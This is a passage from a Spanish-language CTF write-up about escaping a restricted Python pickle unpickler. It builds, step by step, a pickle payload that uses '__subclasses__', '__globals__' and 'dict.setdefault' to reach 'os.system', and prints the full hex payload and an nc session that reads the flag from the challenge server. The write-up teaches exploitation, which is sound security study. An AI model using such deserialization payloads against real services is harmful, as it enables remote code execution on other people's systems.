+</code></pre></div><p>Pero falla de nuevo. En este punto, debemos entender cómo funciona <code>pickle</code>. Básicamente, es una VM con algunos <em>opcodes</em>, una pila y una memoria. Estos son algunos <em>opcodes</em> importantes:</p><ul><li><code>GLOBAL</code>: Este carga un módulo y un símbolo en la pila, para que se pueda llamar después</li><li><code>MARK</code>: Establece una marca de un objeto que irá a la pila</li><li><code>TUPLE</code>: Define una tupla hasta el anterior <code>MARK</code></li><li><code>EMPTY_TUPLE</code>: Sube una tupla vacía sobre la pila</li><li><code>REDUCE</code>: Llama a <code>module.function</code> (de <code>GLOBAL</code>) usando los elementos en la pila como argumentos (de <code>MARK</code>)</li><li><code>PUT</code>: Ingresa al objeto actual de la pila en un índice dado de la memoria</li><li><code>GET</code>: Toma el objeto en un índice dado de la memoria y lo pone en la pila</li><li><code>INT</code>: Define un entero</li><li><code>STRING</code>: Define una <em>string</em></li><li><code>POP</code>: Borra la pila</li><li><code>STOP</code>: Dice a <code>pickle</code> que termine la ejecución</li></ul><p>Hay más <em>opcodes</em> que podrían ser útiles. Más información sobre esta VM de <code>pickle</code> en los siguientes recursos:</p><ul><li><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">Sour Pickles</a></li><li><a href="https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-pickle">ångstromCTF 2021 - Jar/Snake/Ekans</a></li><li><a href="https://rushter.com/blog/pickle-serialization-internals/">How pickle works in Python</a></li><li><a href="https://ctftime.org/writeup/29142">pickled-onions</a></li><li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypassing Python sandboxes</a></li><li><a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles</a></li><li><a href="https://github.com/python/cpython/blob/main/Modules/_pickle.c">_pickle.c</a></li></ul><h3 id="limitaciones">Limitaciones</h3><p>La clase personalizada <code>MyUnpickler</code> restringe mucho (aparte de <code>BLACKLIST_OPCODES</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">module</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"empty"</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1">.count(</span><span class="mtk4">"."</span><span class="mtk1">) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk4">"setattr"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk4">"setitem"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1">:</span>  
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">super</span><span class="mtk1">().</span><span class="mtk8">find_class</span><span class="mtk1">(</span><span class="mtk9 mtki">module</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>
+</code></pre></div><p>En primer lugar, solo podemos usar un módulo llamado <code>empty</code>, que se define como &ldquo;vacío&rdquo;:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">module</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">type</span><span class="mtk1">(</span><span class="mtk1">__builtins__</span><span class="mtk1">)</span>
+<span class="mtk1">empty</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">module</span><span class="mtk1">(</span><span class="mtk4">"empty"</span><span class="mtk1">)</span>
+<span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">modules</span><span class="mtk1">[</span><span class="mtk4">"empty"</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">empty</span>  
+</code></pre></div><p>Entonces, no podemos usar <code>os</code>, <code>sys</code>, <code>__builtins__</code>&mldr; Pero, aunque el módulo está &ldquo;vacío&rdquo;, hay algunos atributos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt;&gt;&gt; empty
+&lt;module 'empty'&gt;
+&gt;&gt;&gt; dir(empty)
+['__doc__', '__loader__', '__name__', '__package__', '__spec__']  
+</code></pre></div><p>Y aún más, si tomamos como inspiración algunos <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">técnicas de escapada de jaulas de Python</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt;&gt;&gt; empty.__dict__
+{'__name__': 'empty', '__doc__': None, '__package__': None, '__loader__': None, '__spec__': None}  
+&gt;&gt;&gt; empty.__class__
+&lt;class 'module'&gt;
+&gt;&gt;&gt; empty.__repr__
+&lt;method-wrapper '__repr__' of module object at 0xffff7f526cf0&gt;
+</code></pre></div><p>Siguiendo con las limitaciones, no podemos usar <code>setattr</code> o <code>setitem</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; help(setattr)
+Help on built-in function setattr in module builtins:
+
+setattr(obj, name, value, /)
+    Sets the named attribute on the given object to the specified value.  
+
+    setattr(x, 'y', v) is equivalent to ``x.y = v''
+
+&gt;&gt;&gt; empty.__setattr__
+&lt;method-wrapper '__setattr__' of module object at 0xffff7f526cf0&gt;
+</code></pre></div><p>Hay una limitación más, que es el número máximo de un punto en el <em>opcode</em> <code>GLOBAL</code>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Con todas las limitaciones, comencé a jugar con la VM de <code>pickle</code> y conseguí que imprimiera una <em>string</em> arbitraria. Primero encontré una forma de hacerlo usando Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; empty.__class__
+&lt;class 'module'&gt;
+&gt;&gt;&gt; empty.__class__.__class__
+&lt;class 'type'&gt;
+&gt;&gt;&gt; empty.__name__
+'empty'
+&gt;&gt;&gt; empty.__class__.__class__(empty.__name__)
+&lt;class 'str'&gt;
+&gt;&gt;&gt; empty.__class__.__class__(empty.__name__)('asdf')  
+'asdf'
+</code></pre></div><p>Y luego lo traduje a código <code>pickle</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = b"\x80\x04cempty\n__class__.__class__\n(cempty\n__name__\ntR(S'asdf'\ntR."  
+&gt;&gt;&gt; pickletools.dis(data)
+    0: \x80 PROTO      4
+    2: c    GLOBAL     'empty __class__.__class__'
+   29: (    MARK
+   30: c        GLOBAL     'empty __name__'
+   46: t        TUPLE      (MARK at 29)
+   47: R    REDUCE
+   48: (    MARK
+   49: S        STRING     'asdf'
+   57: t        TUPLE      (MARK at 48)
+   58: R    REDUCE
+   59: .    STOP
+highest protocol among opcodes = 2
+&gt;&gt;&gt; check(data)
+True
+&gt;&gt;&gt; MyUnpickler(io.BytesIO(data)).load()
+'asdf'
+</code></pre></div><p>La idea es poder acceder al atributo <code>__globals__</code> y encontrar el módulo <code>os</code> para ejecutar <code>system</code>, como se muestra en <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">HackTricks</a>. Podemos hacer esto así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; empty.__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('whoami')  
+root
+0
+</code></pre></div><p>Lo anterior se puede escribir más verbosamente como:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; empty.__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.__getitem__('system')('whoami')  
+root
+0
+</code></pre></div><p>El problema es que no podemos escribir lo anterior como un código <code>pickle</code> que pase todas las limitaciones&mldr;</p><h3 id="el-truco">El truco</h3><p>Hay una función útil aquí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; empty.__dict__
+{'__name__': 'empty', '__doc__': None, '__package__': None, '__loader__': None, '__spec__': None}
+&gt;&gt;&gt; type(empty.__dict__)
+&lt;class 'dict'&gt;
+&gt;&gt;&gt; dir(empty.__dict__)
+['__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__ior__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__or__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__ror__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']  
+</code></pre></div><p>Desplácese un poco si es necesario&mldr; es <code>setdefault</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; empty.__dict__.setdefault
+&lt;built-in method setdefault of dict object at 0xffff7f4e0bc0&gt;
+&gt;&gt;&gt; help(empty.__dict__.setdefault)
+Help on built-in function setdefault:
+
+setdefault(key, default=None, /) method of builtins.dict instance
+    Insert key with a value of default if key is not in the dictionary.  
+
+    Return the value for key if key is in the dictionary, else default.
+</code></pre></div><p>Esta función nos permite establecer un atributo a un objeto <code>dict</code>. Esto es bastante necesario en nuestra situación para almacenar objetos intermedios (recuerde la limitación del número de <code>.</code>). Además, esto es como un <em>bypass</em> para la lista negra de <code>setattr</code> y <code>setitem</code>.</p><p>Entonces, después de varios ejemplos y puebas, escribí el siguiente código <code>pickle</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = b"\x80\x04cempty\n__dict__.setdefault\n(S'a'\ncempty\n__class__.__base__\ntR0cempty\na.__subclasses__\n)Rp0\n0cempty\n__dict__.setdefault\n(S'b'\ng0\ntR0cempty\nb.__getitem__\n(I137\ntRp1\n0cempty\n__dict__.setdefault\n(S'c'\ng1\ntR0cempty\n__dict__.setdefault\n(S'd'\ncempty\nc.__init__\ntR0cempty\n__dict__.setdefault\n(S'e'\ncempty\nd.__globals__\ntR0cempty\ne.__getitem__\n(S'system'\ntR(S'whoami'\ntR."  
+&gt;&gt;&gt; pickletools.dis(data)
+    0: \x80 PROTO      4
+    2: c    GLOBAL     'empty __dict__.setdefault'
+   29: (    MARK
+   30: S        STRING     'a'
+   35: c        GLOBAL     'empty __class__.__base__'
+   61: t        TUPLE      (MARK at 29)
+   62: R    REDUCE
+   63: 0    POP
+   64: c    GLOBAL     'empty a.__subclasses__'
+   88: )    EMPTY_TUPLE
+   89: R    REDUCE
+   90: p    PUT        0
+   93: 0    POP
+   94: c    GLOBAL     'empty __dict__.setdefault'
+  121: (    MARK
+  122: S        STRING     'b'
+  127: g        GET        0
+  130: t        TUPLE      (MARK at 121)
+  131: R    REDUCE
+  132: 0    POP
+  133: c    GLOBAL     'empty b.__getitem__'
+  154: (    MARK
+  155: I        INT        137
+  160: t        TUPLE      (MARK at 154)
+  161: R    REDUCE
+  162: p    PUT        1
+  165: 0    POP
+  166: c    GLOBAL     'empty __dict__.setdefault'
+  193: (    MARK
+  194: S        STRING     'c'
+  199: g        GET        1
+  202: t        TUPLE      (MARK at 193)
+  203: R    REDUCE
+  204: 0    POP
+  205: c    GLOBAL     'empty __dict__.setdefault'
+  232: (    MARK
+  233: S        STRING     'd'
+  238: c        GLOBAL     'empty c.__init__'
+  256: t        TUPLE      (MARK at 232)
+  257: R    REDUCE
+  258: 0    POP
+  259: c    GLOBAL     'empty __dict__.setdefault'
+  286: (    MARK
+  287: S        STRING     'e'
+  292: c        GLOBAL     'empty d.__globals__'
+  313: t        TUPLE      (MARK at 286)
+  314: R    REDUCE
+  315: 0    POP
+  316: c    GLOBAL     'empty e.__getitem__'
+  337: (    MARK
+  338: S        STRING     'system'
+  348: t        TUPLE      (MARK at 337)
+  349: R    REDUCE
+  350: (    MARK
+  351: S        STRING     'whoami'
+  361: t        TUPLE      (MARK at 350)
+  362: R    REDUCE
+  363: .    STOP
+highest protocol among opcodes = 2
+</code></pre></div><p>Y funciona!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; check(data)
+True
+&gt;&gt;&gt; MyUnpickler(io.BytesIO(data)).load()  
+root
+0
+</code></pre></div><p>Ahora ejecutemos <code>cat flag.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = data.replace(b'whoami', b'cat flag.txt')  
+&gt;&gt;&gt; MyUnpickler(io.BytesIO(data)).load()
+HTB{fake_flag_for_testing}
+0
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Entonces, tomemos el código <code>pickle</code> en exadecimal y obtengamos la <em>flag</em> en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data.hex()
+'800463656d7074790a5f5f646963745f5f2e73657464656661756c740a28532761270a63656d7074790a5f5f636c6173735f5f2e5f5f626173655f5f0a74523063656d7074790a612e5f5f737562636c61737365735f5f0a295270300a3063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532762270a67300a74523063656d7074790a622e5f5f6765746974656d5f5f0a28493133370a745270310a3063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532763270a67310a74523063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532764270a63656d7074790a632e5f5f696e69745f5f0a74523063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532765270a63656d7074790a642e5f5f676c6f62616c735f5f0a74523063656d7074790a652e5f5f6765746974656d5f5f0a28532773797374656d270a745228532763617420666c61672e747874270a74522e'  
+</code></pre></div><p>Al principio no se ejecutó bien, y fue porque <code>os</code> no se encontró en el índice <code>137</code> de <code>__subclasses__()</code> sino en el índice <code>138</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 178.62.74.235 32575
+Enter your hex-encoded pickle data: 800463656d7074790a5f5f646963745f5f2e73657464656661756c740a28532761270a63656d7074790a5f5f636c6173735f5f2e5f5f626173655f5f0a74523063656d7074790a612e5f5f737562636c61737365735f5f0a295270300a3063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532762270a67300a74523063656d7074790a622e5f5f6765746974656d5f5f0a28493133380a745270310a3063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532763270a67310a74523063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532764270a63656d7074790a632e5f5f696e69745f5f0a74523063656d7074790a5f5f646963745f5f2e73657464656661756c740a28532765270a63656d7074790a642e5f5f676c6f62616c735f5f0a74523063656d7074790a652e5f5f6765746974656d5f5f0a28532773797374656d270a745228532763617420666c61672e747874270a74522e  
+HTB{P1ckle_15_Aw3s0m3_f0r_S3rial1z4t10n}
+Result: 0
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#pickle-_internals_"><code>pickle</code> <em>internals</em></a><ul><li><a href="#pruebas">Pruebas</a></li><li><a href="#limitaciones">Limitaciones</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#el-truco">El truco</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
